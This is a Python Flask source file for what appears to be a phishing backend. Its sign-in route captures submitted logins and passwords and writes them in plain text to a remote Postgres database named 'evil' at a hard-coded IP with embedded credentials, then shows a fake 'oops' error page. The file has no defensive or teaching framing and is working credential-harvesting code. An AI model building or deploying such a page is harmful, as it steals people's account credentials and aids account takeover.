import psycopg2

from flask import Flask, render_template, redirect, url_for, request

app = Flask(__name__)

global conn
global cursor


@app.route('/')
def index():
    return redirect(url_for('signin'))


@app.route('/signin', methods=['GET', 'POST'])
def signin():
    if request.method == 'POST':
        if 'login' in request.form and 'password' in request.form:
            login = request.form['login']
            password = request.form['password']

            insert_query = """
                    INSERT INTO evil_info (login, password)
                    VALUES (%s, %s)
                    """
            cursor.execute(insert_query, (login, password))
            conn.commit()

            return redirect(url_for('oops'))

    return render_template('signin.html')


@app.route('/oops', methods=['GET'])
def oops():
    return render_template('oops.html')


if __name__ == '__main__':
    conn = psycopg2.connect(
        host="51.250.114.148",
        port="5432",
        database="evil",
        user="evil_user",
        password="evil_user_pass"
    )
    cursor = conn.cursor()
    app.run(debug=True, host='0.0.0.0', port=5000)
